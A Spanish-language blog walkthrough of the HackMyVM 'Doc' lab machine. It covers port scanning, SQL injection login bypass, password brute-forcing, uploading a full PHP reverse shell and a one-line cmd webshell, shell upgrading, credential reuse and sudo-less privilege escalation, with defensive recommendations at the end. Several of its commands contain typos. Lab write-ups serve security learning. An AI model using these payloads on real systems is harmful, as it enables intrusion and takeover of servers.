---
title: "[WriteUp] - Doc (HackMyVM)"
excerpt: "Maquina Doc, Reverse Shell, SQLi"
date: "Jun 10 2025"
cover_image: "/blog/doc-hvm.webp"
alt: "Writeup 3"
tags1: "Hacking"
tags2: "Linux"
---

# Máquina "Doc" (HackMyVM)

[📝 Download PDF Report](https://drive.google.com/file/d/1AUxPmv_p5vBa8ajfXQF_-snrgrmgg8Ly/view?usp=sharing)

[🖥️ Machine Link](https://hackmyvm.eu/machines/machine.php?vm=Doc)

&nbsp;

> *Difficulty Level: ⭐*

&nbsp;

A continuación se relata el reporte de pentesting para la máquina **Doc (OTOMS)** de **HackMyVM** con una dificultad *Facil*.
Se abarcará el uso de Burp Suite hasta el uso de comandos nativos en Linux.

Resumen:

* Escaneo de puertos
* Inyección de SQL
* Explotación de vulnerabilidades
* Reverse Shell Remoto
* Escala de privilegios

**IMPORTANTE** Debes tener una máquina virtual o un sistema operativo de auditoría con privilegios de root y una conexión a Internet.

## Metodologia

* Reconocimiento
* Enumeración
* Búsqueda y análisis de vulnerabilidades
* Explotación
* Post-explotación

**Reconocimiento**: Responde a las preguntas ¿Qué se atacará? y ¿Qué formará
parte de la prueba?

**Enumeración**: Se recolecta toda información posible de lo que se atacará para
realizar la prueba sin contratiempos

**Búsqueda y análisis de vulnerabilidades**: Identifica debilidades sobre lo que se
atacará, puertos, procesos, servicios entre otros.

**Explotación**: Aquí se comienza con el ataque utilizando todo lo anterior y con las
herramientas correctas.

**Post explotación**: Se buscan posibles vulnerabilidades extra o que más se podrá
atacar.

**Reporte de las pruebas**: Se redacta todo lo que se va haciendo durante la
auditoria.

## Reconocimiento yEnumeración

Durante el pre acuerdo se estableció que la maquina Objetivo se encuentra en la Red bajo la IP **192.168.50.129** por lo que esta se convierte en **la máquina objetivo** y de nuestro lado nuestra maquina se representa con la IP **192.168.50.131** .

Gracias a esto procedemos a lanzar un ping a la maquina victima y esperar respuesta.

Una vez con la respuesta por parte de la maquina victima confirmamos mediante el TTL que estamos frente a una máquina **Linux**, aún desconocemos su distribución y versión pero eso lo sabremos más adelante.

Con esta información podemos proceder a lanzar el escaneo usando **Nmap** y esperar que nos de el resultado, en este caso usamos un *--min-rate* alto ya que nos encontramos en un laboratorio controlado y podemos lanzar multiples trazas.

El comando desglosado:

| Campo | Valor |
| --- | --- |
| `-sV` | Intenta determinar la versión de los servicios que se estan ejecutando |
| `-p <x> or -p-` | Escaneo de puertos para el puerto `<x>` o todos |
| `-Pn` | Deshabilita la detección de host y el escaneo de puertos abiertos |
| `-A` | Habilita la detección de OS y la versión, integra más scripts |
| `-sC` | Escanea los scripts predeterminado de Nmap |
| `-v` | Modo detallado |
| `-sS` | TCP escaneo de puertos SYN |
| `-sU` | UDP escaneo |

**Comandos de Shell:**

```bash
nmap -p- -sV 192.168.50.129 --min-rate 5000 -oN all_ports.nmap -Pn

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>

nmap -sCV -p<PORTS> <IP>
```

Al estar en una red local también podemos ejecutar el comando:

```bash
sudo arp-scan --localnet"
```

**Descripción:**
Una vez ejecutado el comando anterior nos arrojó los siguientes servicios corriendo en el sistema.

```bash
Nmap scan report for 192.168.50.129
Host is up (0.00077s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-title: Online Traffic Offense Management System - PHP
MAC Address: 08:00:27:8A:A8:D3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

Aqui se enumeran las vulnerabilidades de los servicios listados

**nginx 1.18.0:**:

**CVE-2021-23017**: Una vulnerabilidad de desbordamiento de búfer en la implementación HTTP/2 de NGINX, que permite a atacantes remotos ejecutar código arbitrario.

**CVE-2021-3618**: Una vulnerabilidad en el resolutor NGINX que permite a atacantes remotos provocar una denegación de servicio (DoS) o ejecutar código arbitrario.

**CVE-2020-11724**: Una vulnerabilidad en el procesamiento de solicitudes HTTP de NGINX que permite a atacantes remotos provocar una denegación de servicio (DoS).

Exploits:

**NGINX HTTP/2 Request Flooding**: Un exploit que aprovecha la vulnerabilidad CVE-2021-23017, permitiendo a los atacantes inundar el servidor con solicitudes HTTP/2, lo que provoca una denegación de servicio (DoS).

**NGINX Resolver Vulnerability**: Un exploit que aprovecha la vulnerabilidad CVE-2021-3618, lo que permite a los atacantes provocar una denegación de servicio (DoS) o, potencialmente, ejecutar código arbitrario.

### Hazaña

Apenas entrar al sitio notamos que no carga por completo lo que es extraño, al revisar y hacer hovering a el login notamos que este deberia redirigir a un domino **doc.hmv** pero este no lo hace.

![Screenshot of Index page](https://i.postimg.cc/PrXjyPPv/sitio-web-victima.png
)

![Screenshot of de tools](https://i.postimg.cc/s2cPp68h/confirmamos-el-dominio.png
)

Entonces como hacemos para que esos recursos carguen como deben?, debe
mos modificar en nuestro sistema como se manejan los dominios, para ellos nos dirigimos a **/etc/hosts** y lo modificamos con nano, ahí agregamos el dominio doc.hm a la ip victima 192.168.50.129 y guardamos, una vez hecho esto y al recargar la pagina notamos que el sitio ahora carga perfectamente junto a todos los recursos e imágenes, entonces ahora somos libres de dar clic al botón de login haber a donde nos redirige

![Screenshot of /etc/hosts](https://i.postimg.cc/zDMCSRd0/modificando-hosts.png)

Ahora podemos observar que todo carga correctamente incluso el panel de login.

![Screenshot of index otoms](https://i.postimg.cc/B6nTN59w/carga.png)

![Screenshot of admin login](https://i.postimg.cc/Kvw0zWSc/admin-login.png)

Nos topamos con un login para administradores, lastimosamente no tenemos acceso a el, probamos credenciales por defecto como admin admin o admin password, pero no se tiene éxito en ello. Podemos probar hacer fuzzing al dominio para ver mas directorios, pero por este momento no lo haremos. También podemos intentar por fuerza bruta y averiguar el usuario, al no encontrar nada mas que nos sea de utilidad en el sitio usamos ese login de admin, asi que primero probemos con burp suite, e interceptamos la respuesta y nos encontramos con algo interesante.

Es una sentencia sql a la base de datos que responde con incorrect

```sql
SELECT * FROM users WHERE username = 'admin' AND password = md5('admin')
```

## Explotación

### SQLi

Nos damos cuenta que esta sentencia sql no esta sanitizada por lo que se puede hacer sqli (**una inyección sql**) con esto podemos lograr devolver datos de una tabla. Ponemos el usuario vacio y ponemos una sentencia booleana 1=1 que esto siempre es correcto, y algo falso con algo correcto en OR siempre será algo correcto. siendo asi podemos intentar con algo simple, como esto

![Screenshot of SQLi consult](https://i.postimg.cc/C5d4MGcf/burpsuite1.png)

```sql
SELECT * FROM users WHERE username ='' OR 1=1#' AND password = md5('admin')
```

![Screenshot of SQLi](https://i.postimg.cc/8PZV0N6K/sqli-enviado.png)

Como tal la inyección sqli ya es una forma de explotación.

Al poner la sentencia y recargar logramos entrar. de igual forma podemos poner la sentencia sql directamente en el formulario de login.

**Recomendación:** Sanitizar los formularios para las consultas sql, agregar una url de imagen, símbolos como **" (°’#* "** pueden causar problemas similares.

```sql
' OR 1=1-- -
```

ó

```sql
' OR 1=1#
```

Al entrar podemos visualizar los usuarios, editar su información, editar el sitio entero cambiarle el nombre u otros datos, asi como ver los usuarios administradores o con accesos. 

Ahí vemos que el nombre de usuario de estos son: **vagrant**, **jsmith** y el usuario con el que entramos **adminyo** podemos editar este pero no podemos editar su contraseña.
Asi que nos ponemos manos a la obra para encontrar la contraseña de este usuario vagrant usando burp suite para la fuerza bruta.

![Screenshot of users panel](https://i.postimg.cc/6p8FbRwq/users-edit.png)

### Encontrando el password para vagrant

Usaremos **fuerza bruta** con *rockyou.txt* pero para ahorrarnos algo de tiempo podemos probar primero con las primeras 100 líneas. con el comando

bash
```bash
head-n 100 /usr/share/wordlist/rockyou.txt > dicpec.txt
```

El cual nos ayudará para la fuerza bruta Una vez cargado el diccionario y establecido el marcador iniciamos el ataque, si en el diccionario se encuentra la contraseña correcta el servidor respondera con handshake de ok o respuesta success. Sea por código de estado o por la longitud de la respuesta. 

Asi el diccionario prueba todas esas contraseñas, vagrant iloveyou, vagrant 12345, vagrant princess, asi hasta encontrar la correcta.

Entonces encontramos que **chelsea** es la contraseña para el usuario vagrant ya que nos respondio con status sucesss, ahora podemos ingresar al panel con este usuario. vagrant, chelsea que es un usuario administrador Windows server según el dashboard

![Fuerza bruta con rockyou](https://i.postimg.cc/Y041BpS6/fuerza-bruta-rock-you.png)

![Screenshot of password](https://i.postimg.cc/br6F3YB1/vagrant-password.png)

Notamos que vagrant es un usuario administrador de windows server, probablemente esto pueda ser de ayuda para más adelante u otra maquina.

### LFI Reverse Shell

Descripción: Como sabemos el sitio esta programado en PHP y si suponemos que el sitio no esta del todo bien programado debido a la facilidad para entrar gracias a la inyección sql también podemos esperar que podamos subir archivos corruptos o de otro tipo a los input de subida de imagen como lo vimos en la maquina de vulnversity de tryhackme, al ser php tenemos que encontrar la exensión que pueda ser aceptada por php para subir una reverse shell, asi que probaremos con la extensión .php como inicio.

Eso puede servirnos para algunas reverse shell que nos ayuden y modificarlas o usar el sitio de revshells y buscar alguna php y solo introducir los datos necesarios. Y entonces después de eso subimos la reverse shell como si fuera una imagen y sorpresiva
mente se sube sin ningún problema, y si apuntamos a donde se subio ese archivo podemos generar la sesión, solo hace falta dar clic derecho en la imagen.

Nos ponemos en escucha por el puerto asignado en en la reverse shell en este caso el 4444 con 
netcat.

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '<IP>';
$port = <PORT>;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

```bash
locate rev php
```

```bash
<?php system($_GET['cmd']);?>
```

[Revshells](https://www.revshells.com)

Y nos ponemos en escucha por netcat asi:

```bash
nc -lnvp <IP>
```

Y listo.

![Terminal](https://i.postimg.cc/kgRhvmFt/ww-data.png)

### Tratamiento de la shell

Este paso es importante ya en ocasiones comandos como ls, nano o less no se visualizan de forma correcta, asi que podemos intentar con esto:

```bash
python -c 'import pty:pty.spawn("/bin/bash")
```

Y si los errores persisten podemos probar con una shell mas elaborada como la siguiente

Ejecutamos lo siguiente:

```bash
script /de/null -c bash
```

Nos arroja como resultado: *Script started, output log file is ‘/dev/null’. Y tenemos que hacer una reconexión con **CTRL + Z** Nos reconectamos con:

```bash
stty raw-echo;fg
```

Ahora escribimos **reset** Entonces nos preguntará que tipo de terminal queremos, asi que escribimos **xterm** y ahora tenemos una mejor terminal, pero no lo suficiente.

Ahora tenemos que exportar algunos parametos, escribimos

```bash
export SHELL=bash TERM=xterm

# Tambien podemos user SHELL=/bin/bash

# Para er las dimensiones de nuestra consola
stty size
stty -a

# Para redimensionar la consola ajustando los parametros
stty rows <ROWS> columns <COLUMNS>
```

### Escalamos a el usuario bella

En el directorio donde se encuentra el sitio podemos encontrar sus configuraciones y una flag:

Después de examinar varios archivos .php en el directorio nos topamos con **initialize.php** donde encontramos la configuración para la conexión para la base de datos, **user bella** y **password bell4yTU**, es para acceder a la base de datos pero comúnmente se reutilizan credenciales, *quizá estas credenciales también puedan ser usadas para acceder a un usuario en la maquina*. Usando el comando cat para ver el archivo */etc/passwd* encontramos que el usuario bella existe y tiene un home y una shell en bash en este servidor Debian, también esta MySQL Server, root y bella.

```bash
cd ~/html/traffic_offense
cat initialize.php
```

![Initialize php](https://i.postimg.cc/6qDC9D7D/Initialize-php.png)

Con el comando `bash-i` podríamos mejorar la shell actual. (Tambien podemos usar los anteriores)

## Post-Explotación

**Severidad:** Critical

Entonces sabiendo lo anterior nos conectamos al usuario bella con `su bella` y el password **bell4yTU** y genial!, tenemos acceso al usuario, pero vaya.. este *no tiene permisos de root*, entonces buscaremos una forma de poder subir a root. 

Usando el comando **sudo -l** podemos ver a que tiene acceso como sudo y notamos que tiene acceso al **comando less** que es un visualizador interactivo de archivos, podemos filtrar, ver líneas, buscar y también podemos ingresar otros comando estando dentro de la herramienta con el signo **!** Entonces si invocamos una bash **!/bin/bash** habiendo ejecutado **sudo less {cualquier archivo}** automáticamente nos volveremos **root**, por lo que es una vulnerabilidad, esta herramienta no debería tener permisos de sudo a menos que queramos que el usuario lo tenga y pueda ser root.

Esto mismo podemos verlo en GTFOBins con Sudo.

`sudo les /etc/profile`

Flag en el directorio home de bella:

> HMVtakemydocs

![Less command](https://i.postimg.cc/1zPcVhWS/comando-less.png)

![Root less](https://i.postimg.cc/zvj151Pf/root-less.png)

Vale, y ahora como root podremos acceder a la carpeta /root, en donde encontraremos la ultima flag.

> HMVfinallyroot

Como curiosidad nos conectamos a la bd con las credenciales de bella y podemos ver en la tabla users, las contraseñas hasheadas de los usuarios, en este caso ya sabemos que **chelsea** es contraseña de **vagrant** y usando *crackstation* o cualquier otra herramienta para md5 podemos ver que la contraseña para Administrador o **adminyo** es **admin123**

Probando esas credenciales ahora nos conectamos con mas facilidad.

![Database](https://i.postimg.cc/vHcPGsKS/bd.png)

![adminyo](https://i.postimg.cc/8CVwdrzq/adminyo.png)

## Análisis y Conclusiones

### Recomendaciones

- Sanitizar las consultas y proteger los formularios de inicio de sesión contra inyecciones sql
- Filtrar el tipo de archivos que se pueden subir en la imagen de perfil o cualquier otro input
- Activar el Rate-limit asi bloqueamos peticiones de fuerza bruta
- No reutilizar contraseñas para los servicios y mucho menos para usuarios
- Usar contraseñas mas fuertes admin123 no es fiable
- Desactivar servicios innecesarios y actualizar dependencias del sitio
- No mantener la bd y sitio en el mismo lugar
- Usar otro método para hashes y no usar md5 ya que es muy débil y obsoleto

---

&nbsp;

> Gracias por leer mi blog, espero que te haya gustado.

&nbsp;

* 💜 Acceso a más Writeups [--> WriteUps](https://aiskoa.vercel.app/writeup)
